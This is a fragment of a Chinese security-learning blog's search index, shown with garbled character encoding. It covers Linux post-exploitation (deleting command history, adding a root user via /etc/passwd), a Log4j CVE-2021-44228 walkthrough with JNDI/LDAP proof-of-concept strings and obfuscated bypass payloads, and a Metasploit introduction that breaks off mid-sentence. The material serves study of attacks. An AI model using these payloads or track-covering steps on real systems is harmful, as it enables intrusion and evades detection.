é™¤ï¼š\næ‰¾åˆ°æƒ³è¦åˆ é™¤çš„å…³é”®å‘½ä»¤ï¼š\nhistory | grep \u0026#34;keyword\u0026#34; ä¸Šé¢æŸ¥è¯¢å¾—åˆ°äº†å¯¹åº”å‘½ä»¤è®°å½•çš„idï¼Œæ¥ä¸‹æ¥è¿›è¡Œåˆ é™¤ï¼š\nhistory -d [num] è™½ç„¶è¿™æ ·åˆ é™¤äº†å†å²è®°å½•ï¼Œä½†æˆ‘ä¸Šé¢æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿè¢«è®°å½•äº†ï¼Œæ‰€ä»¥æˆ‘ä¸ªäººè®¤ä¸ºä¸Šé¢å…³é—­å†å²è®°å½•çš„æ–¹æ³•æ›´æœ‰æ•ˆ\næ·»åŠ ç”¨æˆ· é»˜è®¤å·²ç»æå‡è‡³rootæƒé™\npasswdå†™å…¥ rootæƒé™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡å†™å…¥passwdæ–‡ä»¶è¿›è¡Œç”¨æˆ·å†™å…¥\n/etc/passwd å„éƒ¨åˆ†å«ä¹‰ï¼š\nâ½¤æˆ·åï¼šå¯†ç ï¼šâ½¤æˆ·IDï¼šç»„IDï¼šèº«ä»½æè¿°ï¼šâ½¤æˆ·çš„å®¶â½¬å½•ï¼šâ½¤æˆ·ç™»å½•åæ‰€ä½¿â½¤çš„SHELL å¯ä»¥æ ¹æ®è¿™ä¸ªæ ¼å¼å¢åŠ è¶…çº§ç”¨æˆ·ï¼š\né¦–å…ˆæ„é€ ä¸€ä¸ªYuy0ungç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼š\n"
    }
,
    {
        "title": "Log4jæ¼æ´",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/log4j%E6%BC%8F%E6%B4%9E/",
        "content": "Log4jæ¼æ´ åœ¨https://yuy0ung.github.io/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/jndi%E6%B3%A8%E5%85%A5/ï¼Œå­¦ä¹ äº†JNDIæ³¨å…¥ï¼Œç°åœ¨æ¥å­¦ä¸€ä¸ªå¾ˆç»å…¸çš„JNDIæ³¨å…¥ï¼šLog4j\nLog4jæ”¯æŒlookupåŠŸèƒ½ï¼ˆçœ‹åˆ°è¿™ä¸ªå°±çŸ¥é“è¦æ‰“ jndi ï¼‰ã€‚ä¾‹å¦‚å½“å¼€å‘è€…æƒ³åœ¨æ—¥å¿—ä¸­æ‰“å°ä»Šå¤©çš„æ—¥æœŸï¼Œåˆ™åªéœ€è¦è¾“å‡º${data:MM-dd-yyyy}ï¼Œæ­¤æ—¶log4jä¼šå°†${}ä¸­åŒ…è£¹çš„å†…å®¹å•ç‹¬å¤„ç†ï¼Œå°†å®ƒè¯†åˆ«ä¸ºæ—¥æœŸæŸ¥æ‰¾ï¼Œç„¶åå°†è¯¥è¡¨è¾¾å¼æ›¿æ¢ä¸ºä»Šå¤©çš„æ—¥æœŸå†…å®¹è¾“å‡ºä¸ºâ€œ08-22-2022â€ï¼Œè¿™æ ·åšå°±ä¸éœ€è¦å¼€å‘è€…è‡ªå·±å»ç¼–å†™æŸ¥æ‰¾æ—¥æœŸçš„ä»£ç ã€‚ç©¶å…¶æ ¹æœ¬ï¼Œè¿˜æ˜¯æœ€åè°ƒç”¨è§¦å‘äº† jndi\nleaderè€ƒè¿‡æˆ‘ï¼Œâ€œè¿™ä¸æ˜¯ä¸€ä¸ªæ—¥å¿—æ¡†æ¶ä¹ˆï¼Œä¸ºä»€ä¹ˆè¦æ”¯æŒJNDIæŸ¥è¯¢å‘¢ï¼Ÿä¸æ˜¯æ”¯æŒæ—¥æœŸç­‰åŸºç¡€åŠŸèƒ½å°±å¤Ÿäº†å—ï¼Ÿâ€ï¼Œåæ¥æŸ¥é˜…äº†ä¸€ä¸‹ï¼ŒLog4j çš„ lookup åŠŸèƒ½ä¹‹æ‰€ä»¥â€œç”»è›‡æ·»è¶³â€åœ°æ”¯æŒ JNDIï¼Œæ—©æœŸè®¾è®¡é‡ŒæŠŠå®ƒå½“æˆä¸€ç§é€šç”¨èµ„æºå®šä½æœºåˆ¶ï¼š å¼€å‘è€…æƒ³åœ¨æ—¥å¿—é‡ŒåŠ¨æ€æ‰“å°ä»»æ„ Java å¯¹è±¡ï¼ˆæ•°æ®æºã€é…ç½®é¡¹ã€EJB å¼•ç”¨ã€JMS é˜Ÿåˆ—åâ€¦â€¦ï¼‰æ—¶ï¼Œåªè¦ä¸€æ¡ ${jndi:...} å°±èƒ½è®©å®¹å™¨å» JNDI æ ‘é‡ŒæŸ¥æ‰¾ï¼Œçœæ‰è‡ªå·±å†å†™ä¸€å¥— lookup ä»£ç \næ¼æ´å¤ç° åœ¨log4j2çš„2.0-beta9 åˆ° 2.15.0ï¼ˆä¸åŒ…æ‹¬å®‰å…¨ç‰ˆæœ¬ 2.12.2ã€2.12.3 å’Œ 2.3.1ï¼‰ç‰ˆæœ¬å†…å­˜åœ¨ç€JNDIæ³¨å…¥çš„CVE-2021-44228\næˆ‘ä»¬å…ˆå¼•å…¥æ¼æ´ç‰ˆæœ¬çš„Log4jï¼š\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç„¶åè¿è¡Œè¿™ä¸ªdemoï¼š\npackage com.yuy0ung; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Log4jDemo { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args) { String username = \u0026#34;${jndi:ldap://localhost:9999/LDAPPoc}\u0026#34;; logger.error(\u0026#34;hello {}\u0026#34;,username); } } æˆåŠŸæ‰§è¡Œå‘½ä»¤\næ¼æ´æˆå›  ç®€å•æ¥è¯´ï¼Œlog4j ä¼šæŠŠ ${} åŒ…è£¹çš„è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œæœ€åä¼šè§¦å‘ lookup\næˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ï¼š\nè·Ÿè¿›åˆ°PatternLayout#toSerializable æ–¹æ³•ï¼Œå¯¹ formatters è¿›è¡Œå¾ªç¯å¤„ç†ï¼š\nè¿™ä¸ªç±»å°±æ˜¯å°†æ—¥å¿—å†…å®¹æŒ‰ log4j2.xml æ–‡ä»¶ä¸­è§„å®šå¥½çš„æ ¼å¼é‚£æ ·è¾“å‡ºï¼Œæˆ‘ä»¬è¿™é‡Œçš„æ ¼å¼ä¸º [%-5p] %d %c - %m%n æ‰€ä»¥ç¬¬ä¸ƒæ¬¡å¾ªç¯å°±ä¼šå¤„ç† %m ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„æ—¥å¿—æ¶ˆæ¯ï¼Œä¼šè°ƒç”¨åˆ°org.apache.logging.log4j.core.pattern.MessagePatternConverter#format\nå¾ªç¯åˆ°ç¬¬7æ¬¡æ—¶è·Ÿè¿›åˆ°formatæ–¹æ³•ï¼š\næˆ‘ä»¬è·Ÿè¿›åˆ°ç¬¬äºŒä¸ªifï¼š\nè¿™é‡Œçš„ this.config å°±æ˜¯æˆ‘ä»¬å®ç°log4j2çš„æ–‡ä»¶ç±»å‹ï¼Œè¿™é‡Œæ˜¯xmlï¼Œthis.noLookups ä¸º false åˆ™ä»£è¡¨å¯ç”¨ ${} å˜é‡æ›¿æ¢ï¼Œè¿™é‡Œæˆ‘ä»¬æ²¡æœ‰åœ¨xmlä¸­æ˜¾å¼è§„å®šç¦ç”¨ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯å¯ç”¨çš„ï¼Œè€Œä¸”æˆ‘ä»¬è¿™é‡Œæœ¬æ¥å°±éœ€è¦ç”¨åˆ°å˜é‡æ›¿æ¢\nç„¶åè¿›å…¥åˆ° if è¯­å¥é‡Œé¢ï¼Œå¦‚æœæ£€æµ‹åˆ° ${ å¼€å¤´ï¼Œåˆ™å–å‡ºä» offset åˆ°å½“å‰ workingBuilder æœ«å°¾çš„å†…å®¹ï¼Œæ•…è¿™é‡Œ value çš„å€¼å°±ä¸ºå½“æ—¶è¾“å…¥çš„å€¼ï¼š\nç»§ç»­è·Ÿè¿› replace() æ–¹æ³•ï¼Œreplace() æ–¹æ³•é‡Œé¢è°ƒç”¨äº† substitute() æ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯å°† ${} ä¸­é—´çš„å†…å®¹å–å‡ºæ¥ï¼Œç„¶ååˆä¼šè°ƒç”¨ this.subtitute æ¥å¤„ç†ã€‚æœ€åè°ƒç”¨åˆ° resolveVariable æ–¹æ³•ï¼š\nresolverè§£ææ—¶æ”¯æŒçš„å…³é”®è¯æœ‰[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨çš„jndi:xxxåç»­å°±ä¼šç”¨åˆ°JndiLookupè¿™ä¸ªè§£æå™¨ï¼š\nè·Ÿè¿›åˆ°è§£æå™¨çš„lookup()æ–¹æ³•ï¼Œè¿™é‡ŒåŒæ ·è°ƒç”¨äº†ä¸€ä¸ªlookup()æ–¹æ³•ï¼š\nè¿™ä¸ª lookup() æ–¹æ³•ä¹Ÿå°±æ˜¯ jndi é‡Œé¢åŸç”Ÿçš„æ–¹æ³•ï¼Œåœ¨æˆ‘ä»¬è®© jndi å»è°ƒç”¨ rmi æœåŠ¡çš„æ—¶å€™ï¼Œæ˜¯è°ƒç”¨åŸç”Ÿçš„ lookup() æ–¹æ³•ï¼š\né‚£ä¹ˆè¿™é‡Œå°±è§¦å‘JNDIæ³¨å…¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œäº†ï¼Œæ•´æ¡åˆ©ç”¨é“¾ç»“æŸ\nbypass è®°å½•ä¸€ç‚¹bypassæ‰‹æ®µï¼š\né€’å½’è§£æç»•è¿‡ï¼šlog4j2 æ”¯æŒè¡¨è¾¾å¼é€’å½’è§£æï¼Œä¸‹é¢çš„è¡¨è¾¾å¼ä¼šé€å±‚è§£æï¼Œç”±äº :-æ˜¯é”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œè€Œè¡¨è¾¾å¼åªç®¡å–å€¼ï¼Œä»è€Œä½¿å¾— {::-j} -\u0026gt; jï¼Œç±»ä¼¼çš„å¯ä»¥æ··æ·†å…¶ä»–å­—ç¬¦ã€‚\nloggr.info(\u0026#34;${${::-j}ndi:ldap://127.0.0.1:9999/exp}\u0026#34;); logger.info(\u0026#34;${${,:-j}ndi:ldap://127.0.0.1:1099/exp}\u0026#34;) lowwer / upper ç»•è¿‡ï¼šä½¿ç”¨ log4j2 æ”¯æŒçš„å…³é”®å­—ï¼Œå®ç°å¤§å°å†™ç»•è¿‡\nlogg.info(\u0026#34;${${lower:J}ndi:ldap://127.0.0.1:9999/exp}\u0026#34;); é˜²å¾¡ æ›´æ–°log4jè‡³ rc2 é…ç½®é˜²ç«å¢™ç­–ç•¥ï¼Œç¦æ­¢ä¸»åŠ¨è¿æ¥å¤–ç½‘è®¾å¤‡ å‡çº§å—å½±å“çš„åº”ç”¨åŠç»„ä»¶ è¿‡æ»¤ç›¸å…³çš„å…³é”®è¯ï¼Œæ¯”å¦‚${jndi://*} é™åˆ¶JNDIé»˜è®¤å¯ä»¥ä½¿ç”¨çš„åè®® é™åˆ¶å¯ä»¥é€šè¿‡LDAPè®¿é—®çš„æœåŠ¡å™¨å’Œç±» ",
        "summary": "Log4jæ¼æ´ åœ¨https://yuy0ung.github.io/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/jndi%E6%B3%A8%E5%85%A5/ï¼Œå­¦ä¹ äº†JNDIæ³¨å…¥ï¼Œç°åœ¨æ¥å­¦ä¸€ä¸ªå¾ˆç»å…¸çš„JNDIæ³¨å…¥ï¼šLog4j\nLog4jæ”¯æŒlookupåŠŸèƒ½ï¼ˆçœ‹åˆ°è¿™ä¸ªå°±çŸ¥é“è¦æ‰“ jndi ï¼‰ã€‚ä¾‹å¦‚å½“å¼€å‘è€…æƒ³åœ¨æ—¥å¿—ä¸­æ‰“å°ä»Šå¤©çš„æ—¥æœŸï¼Œåˆ™åªéœ€è¦è¾“å‡º${data:MM-dd-yyyy}ï¼Œæ­¤æ—¶log4jä¼šå°†${}ä¸­åŒ…è£¹çš„å†…å®¹å•ç‹¬å¤„ç†ï¼Œå°†å®ƒè¯†åˆ«ä¸ºæ—¥æœŸæŸ¥æ‰¾ï¼Œç„¶åå°†è¯¥è¡¨è¾¾å¼æ›¿æ¢ä¸ºä»Šå¤©çš„æ—¥æœŸå†…å®¹è¾“å‡ºä¸ºâ€œ08-22-2022â€ï¼Œè¿™æ ·åšå°±ä¸éœ€è¦å¼€å‘è€…è‡ªå·±å»ç¼–å†™æŸ¥æ‰¾æ—¥æœŸçš„ä»£ç ã€‚ç©¶å…¶æ ¹æœ¬ï¼Œè¿˜æ˜¯æœ€åè°ƒç”¨è§¦å‘äº† jndi\nleaderè€ƒè¿‡æˆ‘ï¼Œâ€œè¿™ä¸æ˜¯ä¸€ä¸ªæ—¥å¿—æ¡†æ¶ä¹ˆï¼Œä¸ºä»€ä¹ˆè¦æ”¯æŒJNDIæŸ¥è¯¢å‘¢ï¼Ÿä¸æ˜¯æ”¯æŒæ—¥æœŸç­‰åŸºç¡€åŠŸèƒ½å°±å¤Ÿäº†å—ï¼Ÿâ€ï¼Œåæ¥æŸ¥é˜…äº†ä¸€ä¸‹ï¼ŒLog4j çš„ lookup åŠŸèƒ½ä¹‹æ‰€ä»¥â€œç”»è›‡æ·»è¶³â€åœ°æ”¯æŒ JNDIï¼Œæ—©æœŸè®¾è®¡é‡ŒæŠŠå®ƒå½“æˆä¸€ç§é€šç”¨èµ„æºå®šä½æœºåˆ¶ï¼š å¼€å‘è€…æƒ³åœ¨æ—¥å¿—é‡ŒåŠ¨æ€æ‰“å°ä»»æ„ Java å¯¹è±¡ï¼ˆæ•°æ®æºã€é…ç½®é¡¹ã€EJB å¼•ç”¨ã€JMS é˜Ÿåˆ—åâ€¦â€¦ï¼‰æ—¶ï¼Œåªè¦ä¸€æ¡ ${jndi:...} å°±èƒ½è®©å®¹å™¨å» JNDI æ ‘é‡ŒæŸ¥æ‰¾ï¼Œçœæ‰è‡ªå·±å†å†™ä¸€å¥— lookup ä»£ç \næ¼æ´å¤ç° åœ¨log4j2çš„2.0-beta9 åˆ° 2.15.0ï¼ˆä¸åŒ…æ‹¬å®‰å…¨ç‰ˆæœ¬ 2.12.2ã€2.12.3 å’Œ 2.3.1ï¼‰ç‰ˆæœ¬å†…å­˜åœ¨ç€JNDIæ³¨å…¥çš„CVE-2021-44228\næˆ‘ä»¬å…ˆå¼•å…¥æ¼æ´ç‰ˆæœ¬çš„Log4jï¼š\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç„¶åè¿è¡Œè¿™ä¸ªdemoï¼š\npackage com.yuy0ung; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Log4jDemo { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args) { String username = \u0026#34;${jndi:ldap://localhost:9999/LDAPPoc}\u0026#34;; logger.error(\u0026#34;hello {}\u0026#34;,username); } } æˆåŠŸæ‰§è¡Œå‘½ä»¤\n"
    }
,
    {
        "title": "MSF\u0026CSä»‹ç»ä¸ä½¿ç”¨",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/",
        "content": "MSF\u0026amp;CSä»‹ç»ä¸ä½¿ç”¨ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œè¯·å‹¿ç”¨äºè¿æ³•æ´»åŠ¨\nMetasploit Frameworkï¼ˆMSFï¼‰ Metasploitæ˜¯rubyè¯­è¨€å¼€å‘çš„ä¸€ä¸ªåŸºäºå‘½ä»¤è¡Œæ“ä½œçš„æ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾ï¼Œåˆ©ç”¨å’ŒéªŒè¯æ¼æ´ï¼Œé™„å¸¦æ•°åƒä¸ªå·²çŸ¥çš„è½¯ä»¶æ¼æ´ï¼Œå¹¶ä¿æŒæŒç»­æ›´æ–°ã€‚Metasploitå¯ä»¥ç”¨æ¥ä¿¡æ¯æ”¶é›†ã€æ¼æ´æ¢æµ‹ã€æ¼æ´åˆ©ç”¨ç­‰æ¸—é€æµ‹è¯•çš„å…¨æµç¨‹\nä¸€ã€msfä½“ç³»æ¡†æ¶ msfçš„æ•´ä½“æ¡†æ¶å¦‚ä¸‹ï¼š\næˆ‘ä»¬é‡ç‚¹å…³æ³¨æ¨¡å—éƒ¨åˆ†\næ¨¡å—ç»„ç»‡æŒ‰ç…§ä¸åŒçš„ç”¨é€”åˆ†ä¸º7ç§ç±»å‹çš„æ¨¡å—ï¼ˆModulesï¼‰ï¼š\nè¾…åŠ©æ¨¡å—ï¼ˆAux)ï¼šè´Ÿè´£ä¿¡æ¯æ”¶é›†ã€æ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ã€å£ä»¤çŒœæµ‹å’ŒDosæ”»å‡»ç­‰åŠŸèƒ½ æ¸—é€æ”»å‡»æ¨¡å—ï¼ˆExploits)ï¼šåˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»ï¼Œé‡Œé¢æœ‰æ¯ä¸€ä¸ªå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³• åæ¸—é€æ”»å‡»æ¨¡å—ï¼ˆPost)ï¼šåœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒé™åï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€è·³æ¿æ”»å‡»ç­‰æ“ä½œ æ”»å‡»è½½è·æ¨¡å—ï¼ˆpayloads)ï¼šæˆåŠŸexploitä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ ç¼–ç å™¨æ¨¡å—ï¼ˆEncoders)ï¼šä¸»è¦å¯¹payloadè¿›è¡ŒåŠ å¯†ï¼Œæœ€ç»ˆè¾¾åˆ°èº²é¿AntiVirusæ£€æŸ¥çš„ç›®çš„ ç©ºæŒ‡ä»¤æ¨¡å—ï¼ˆNops)ï¼šä¸»è¦ä½œç”¨æ˜¯æé«˜payloadç¨³å®šæ€§åŠç»´æŒå¤§å° å…æ€æ¨¡å—(Evasion)ï¼šå¯ä»¥ç”¨æ¥åˆ›å»ºæœ¨é©¬æ–‡ä»¶ äºŒã€MetasploitåŸºæœ¬ä½¿ç”¨ kaliä¸­è‡ªå¸¦äº†msfï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨\nMetasploitå¯åŠ¨ msfæœ‰ä¸€ä¸ªç”¨äºå­˜å‚¨ä¿¡æ¯æ”¶é›†æ•°æ®çš„å…³ç³»å‹æ•°æ®åº“Postgresqlï¼Œå¯ä»¥è‡ªä¸»é€‰æ‹©æ˜¯å¦å¼€å¯\nmsfæœ‰ä¸‰ç§å¯åŠ¨æ–¹å¼ï¼š\nå…ˆå¯åŠ¨Postgresqlæ•°æ®åº“ï¼Œå†å¯åŠ¨Metasploit\nservice postgresql start msfconsole ä¸å¯åŠ¨æ•°æ®åº“ï¼Œç›´æ¥å¯åŠ¨Metasploit\nmsfconsole å¯åŠ¨Postgresqlçš„åŒæ—¶å¯åŠ¨Metasploit\nmsfdb run ä¹Ÿå¯ä»¥ç›´æ¥åœ¨kaliå·¦ä¸Šè§’å·¥å…·ç‚¹å‡»å¯åŠ¨ï¼Œå®é™…ä¸Šæ˜¯è‡ªåŠ¨æ‰§è¡Œäº†å‘½ä»¤ï¼š\nsudo msfdb init \u0026amp;\u0026amp; msfconsole ç”±äºPostgresqlæ•°æ®åº“çš„é»˜è®¤ç«¯å£ä¸º5432ï¼Œæ‰€ä»¥å¯ä»¥æŸ¥çœ‹è¯¥ç«¯å£æ¥åˆ¤æ–­æ˜¯å¦å¼€å¯Postgresqlæ•°æ®åº“ï¼š\nnetstat -pantu | grep 5432 Metasploitå¸¸ç”¨å‘½ä»¤ åœ¨msfconsoleä¸­ï¼Œè¾“å…¥helpå¯ä»¥çœ‹è§å„ç§å‘½ä»¤çš„ä»‹ç»\nshowå±•ç¤º ç”¨äºå±•ç¤ºå¯ç”¨æ¨¡å—ï¼Œæœ‰æ•ˆå‚æ•°æ˜¯ï¼šallï¼Œencodersï¼Œnopsï¼Œexploitsï¼Œpayloadsï¼Œauxiliary, postï¼Œpluginsï¼Œinfoï¼Œoptions\nå±•ç¤ºæ¨¡å—æ—¶ï¼Œæ¯ä¸ªæ¨¡å—éƒ½ä¼šæœ‰ä¸€ä¸ªåä¸ºRankçš„å­—æ®µï¼Œè¯¥åˆ—ä»£è¡¨è¯¥æ¨¡å—çš„å¯é æ€§\nRank çš„å€¼å¯ä»¥æ˜¯ä¸‹é¢çš„è¡¨æ ¼ä¸­çš„å…¶ä¸­ä¹‹ä¸€ï¼ŒæŒ‰ç…§å¯é æ€§é™åºæ’åˆ—\nRanking Description ExcellentRanking æ¼æ´åˆ©ç”¨ç¨‹åºç»å¯¹ä¸ä¼šä½¿ç›®æ ‡æœåŠ¡å´©æºƒï¼Œå°±åƒ SQL æ³¨å…¥ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«ç­‰ç­‰ã€‚é™¤éæœ‰ç‰¹æ®Šæƒ…å†µï¼Œå…¸å‹çš„å†…å­˜ç ´ååˆ©ç”¨ç¨‹åºä¸å¯ä»¥è¢«è¯„ä¼°ä¸ºè¯¥çº§åˆ«ã€‚ï¼ˆWMF Escape()ï¼‰ GreatRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºæœ‰ä¸€ä¸ªé»˜è®¤çš„ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”å¯ä»¥è‡ªåŠ¨æ£€æµ‹é€‚å½“çš„ç›®æ ‡ç³»ç»Ÿï¼Œæˆ–è€…åœ¨ç›®æ ‡æœåŠ¡çš„ç‰ˆæœ¬æ£€æŸ¥ä¹‹åå¯ä»¥è¿”å›åˆ°ä¸€ä¸ªç‰¹å®šäºåº”ç”¨çš„è¿”å›åœ°å€ã€‚ï¼ˆè¯‘è€…æ³¨ï¼šæœ‰äº›äºŒè¿›åˆ¶çš„æ¼æ´åˆ©ç”¨æˆåŠŸåï¼Œéœ€è¦ç‰¹åˆ«è®¾ç½® Shell é€€å‡ºåçš„è¿”å›åœ°å€ï¼Œå¦åˆ™å½“ Shell ç»“æŸåï¼Œç›®æ ‡æœåŠ¡å™¨ä¼šå´©æºƒæ‰ã€‚ï¼‰ GoodRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºæœ‰ä¸€ä¸ªé»˜è®¤ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”æ˜¯è¿™ç§ç±»å‹è½¯ä»¶çš„â€œå¸¸è§æƒ…å†µâ€ï¼ˆè‹±æ–‡ï¼Œæ¡Œé¢åº”ç”¨ç¨‹åºçš„Windows 7ï¼ŒæœåŠ¡å™¨çš„2012ç­‰å¸¸ç”¨ï¼‰ NormalRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºæ˜¯å¯é çš„ï¼Œä½†æ˜¯ä¾èµ–äºç‰¹å®šçš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”ä¸èƒ½æˆ–è€…ä¸èƒ½å¯é åœ°è‡ªåŠ¨æ£€æµ‹ã€‚ AverageRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºä¸å¯é æˆ–è€…éš¾ä»¥åˆ©ç”¨ã€‚ LowRanking å¯¹äºé€šç”¨çš„å¹³å°è€Œè¨€ï¼Œè¯¥æ¼æ´åˆ©ç”¨ç¨‹åºå‡ ä¹ä¸èƒ½åˆ©ç”¨ï¼ˆæˆ–è€…ä½äº 50% çš„åˆ©ç”¨æˆåŠŸç‡ï¼‰ ManualRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºä¸ç¨³å®šæˆ–è€…éš¾ä»¥åˆ©ç”¨å¹¶ä¸”åŸºäºæ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰ã€‚å¦‚æœä¸€ä¸ªæ¨¡å—åªæœ‰åœ¨ç”¨æˆ·ç‰¹åˆ«é…ç½®è¯¥æ¨¡å—çš„æ—¶å€™æ‰ä¼šè¢«ç”¨åˆ°ï¼Œå¦åˆ™è¯¥æ¨¡å—ä¸ä¼šè¢«ä½¿ç”¨åˆ°ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥è¯„ä¸ºè¯¥ç­‰çº§ã€‚ï¼ˆä¾‹å¦‚ï¼šexploit/unix/webapp/php_evalï¼‰ searchæœç´¢ å·²çŸ¥ä¸€ä¸ªæ¼æ´ï¼Œæˆ‘æƒ³çŸ¥é“Metasploité‡Œé¢æ˜¯å¦æœ‰ç›¸å…³çš„æ¨¡å—ï¼Œå°±å¯ä»¥ç”¨searchè¿›è¡Œæœç´¢\nç›´æ¥æ‰§è¡Œsearch [è¦æŸ¥æ‰¾çš„å†…å®¹]ï¼ˆå¤§å°å†™ä¸æ•æ„Ÿï¼‰ï¼ŒæŸ¥å¾—å¾ˆå¹¿æ³›ï¼Œå¯ä»¥æ ¹æ®åå­—ã€è·¯å¾„ã€å¹³å°ã€ç±»å‹ã€è”åˆæŸ¥è¯¢ï¼Œä¾‹å¦‚:\n#æ ¹æ®åå­— search name:mysql #æ ¹æ®è·¯å¾„ search path:mysql #æ ¹æ®å¹³å° search platform:windows #æ ¹æ®ç±»å‹ search type:exploit #è”åˆæŸ¥è¯¢ search name:mysql type:exploit rank:excellent useä½¿ç”¨ é€šè¿‡searchæ‰¾åˆ°äº†ç›®æ ‡æ¨¡å—åï¼Œç”¨use [åºå·]æˆ–use [å…¨å]ä½¿ç”¨å…·ä½“æ¨¡å—\nåœ¨useäº†å…·ä½“æ¨¡å—ä¹‹åï¼Œæœ‰å¦‚ä¸‹å¸¸ç”¨å‘½ä»¤ï¼š\n**backï¼š**é€€å‡ºå½“å‰è°ƒç”¨çš„æ¨¡å— **infoï¼š**æ˜¾ç¤ºæ¨¡å—ç›¸å…³ä¿¡æ¯ **show missingï¼š**å±•ç¤ºå¿…å¡«çš„é€‰é¡¹ **show optionsï¼š**å±•ç¤ºæ‰€æœ‰é€‰é¡¹ **show targetsï¼š**å±•ç¤ºå¯æ”»å‡»ç›®æ ‡ **show payloadï¼š**å±•ç¤ºæ”»å‡»è½½è· **setï¼š**ç”¨äºè®¾ç½®é€‰é¡¹ä¸­çš„å‚æ•° **unsetï¼š**å–æ¶ˆè®¾ç½®å‚æ•° **exploit/runï¼š**é…ç½®å¥½é€‰é¡¹å‚æ•°ä¹‹åå‘èµ·æ”»å‡»ï¼ˆä¸¤è€…çš„å‚æ•°è§„åˆ™ç•¥æœ‰åŒºåˆ«ï¼‰ ä¸‰ã€Metasploitæ”»å‡»æµç¨‹ åŸºæœ¬æ”»å‡»æµç¨‹å¦‚ä¸‹å›¾ï¼š\nå››ã€Metasploitable2-Linuxé¶æœº Metasploitable2è™šæ‹Ÿç³»ç»Ÿæ˜¯ä¸€ä¸ªç‰¹åˆ«åˆ¶ä½œçš„ubuntuæ“ä½œç³»ç»Ÿï¼Œæœ¬èº«è®¾è®¡ç›®çš„æ˜¯ä½œä¸ºå®‰å…¨å·¥å…·æµ‹è¯•å’Œæ¼”ç¤ºå¸¸è§æ¼æ´æ”»å‡»çš„ç¯å¢ƒã€‚å…¶ä¸­æœ€é‡è¦çš„æ˜¯å¯ä»¥ç”¨æ¥ä½œä¸ºMSFæ”»å‡»ç”¨çš„é¶æœº\né¶æœºå¼€æ”¾äº†å¾ˆå¤šçš„é«˜å±ç«¯å£å¦‚21ã€23ã€445ç­‰ï¼Œè€Œä¸”å…·æœ‰å¾ˆå¤šæœªæ‰“è¡¥ä¸çš„é«˜å±æ¼æ´ï¼Œ å¦‚Samba 